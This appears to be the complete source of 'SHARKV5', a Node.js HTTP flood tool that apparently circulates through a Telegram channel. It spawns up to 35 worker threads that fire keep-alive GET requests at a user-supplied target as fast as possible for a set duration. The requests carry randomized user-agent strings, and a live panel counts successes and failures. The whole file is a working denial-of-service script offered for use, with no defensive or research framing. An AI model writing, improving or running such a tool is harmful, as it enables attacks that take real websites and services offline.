const http = require('http');
const { Worker, isMainThread, workerData } = require('worker_threads');
const readline = require('readline');
const net = require('net');

const TAGS = ['S.T.S', 'T.S.P', 'SL S.T.S TERROR'];
const THREADS_MIN = 15;
const THREADS_MAX = 35;
const MAX_CONN_PER_THREAD = 25; // lowered to reduce overload
const LIVE_REFRESH_RATE = 100;

let totalRequests = 0;
let successCount = 0;
let errorCount = 0;
let rpsLastSecond = 0;
let maxRps = 0;
let end = 0;

function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUA() {
  const tag = TAGS[Math.floor(Math.random() * TAGS.length)];
  return `Mozilla/5.0 (SHARK/${Math.random().toFixed(5)}) ${tag}`;
}

if (isMainThread) {
  if (process.argv.length < 4) {
    console.error("Usage: node sharkv5.js <target> <duration_sec>");
    process.exit(1);
  }

  const target = process.argv[2];
  const duration = parseInt(process.argv[3]);
  end = Date.now() + duration * 1000;

  let activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
  for (let i = 0; i < activeThreads; i++) {
    new Worker(__filename, { workerData: { target, duration } });
  }

  // Dynamic thread count update every 20s
  setInterval(() => {
    activeThreads = getRandomInt(THREADS_MIN, THREADS_MAX);
    maxRps = Math.max(maxRps, rpsLastSecond);
    rpsLastSecond = 0;
  }, 20000);

  setInterval(() => {
    renderStats();
  }, LIVE_REFRESH_RATE);

  function renderStats() {
    const remaining = Math.max(0, end - Date.now());
    const mins = Math.floor(remaining / 60000);
    const secs = Math.floor((remaining % 60000) / 1000);

    readline.cursorTo(process.stdout, 0, 0);
    readline.clearScreenDown(process.stdout);
    console.log(`SHARKV5 - T.ME/STSVKINGDOM`);
    console.log(`==============================`);
    console.log(`total: ${successCount + errorCount}`);
    console.log(`max-r: ${maxRps}`);
    console.log(`==============================`);
    console.log(`succes: ${successCount}`);
    console.log(`vape: ${errorCount}`);
    console.log(`==============================`);
    console.log(`REMAINING: ${mins}:${secs < 10 ? '0' : ''}${secs}`);
  }

  // Stats IPC server
  const server = net.createServer(socket => {
    socket.on('data', data => {
      const msg = data.toString();
      if (msg === 'ok') {
        successCount++;
        rpsLastSecond++;
      } else if (msg === 'err') {
        errorCount++;
      }
    });
  });
  server.listen(9999);

} else {
  const { target, duration } = workerData;
  const endTime = Date.now() + duration * 1000;
  const socket = net.connect(9999, '127.0.0.1');
  const sendStat = msg => socket.write(msg);

  // Agent reused to avoid overhead
  const agent = new http.Agent({ keepAlive: true, maxSockets: 10 });

  function flood() {
    if (Date.now() > endTime) return;

    const options = {
      agent,
      method: 'GET',
      headers: {
        'User-Agent': randomUA(),
        'Accept': '*/*',
        'Connection': 'keep-alive',
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache'
      }
    };

    try {
      const req = http.request(target, options, res => {
        // Consume data to avoid memory leak
        res.on('data', () => {});
        res.on('end', () => sendStat('ok'));
      });

      req.on('error', () => sendStat('err'));
      req.end();
    } catch {
      sendStat('err');
    }

    // Flood as fast as possible, but with small delay to prevent overload
    setTimeout(flood, 0);
  }

  // Start limited concurrent requests per thread
  for (let i = 0; i < MAX_CONN_PER_THREAD; i++) {
    flood();
  }
}
